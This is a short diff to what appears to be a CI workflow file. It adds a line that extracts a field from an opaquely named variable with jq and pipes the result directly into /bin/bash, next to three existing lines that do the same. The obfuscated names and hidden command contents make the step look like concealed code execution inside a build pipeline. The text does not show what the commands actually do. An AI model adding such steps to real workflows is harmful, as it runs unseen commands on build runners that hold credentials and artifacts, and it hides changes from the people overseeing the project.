@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$bq334" | jq -r .qhdg21 | /bin/bash
           echo $vses3 | jq -r .s9 | /bin/bash
           echo $tmus014 | jq -r .gzc98036 | /bin/bash
+          echo $w0 | jq -r .esnz64 | /bin/bash
 
       - name: Store artifact
         if: always()
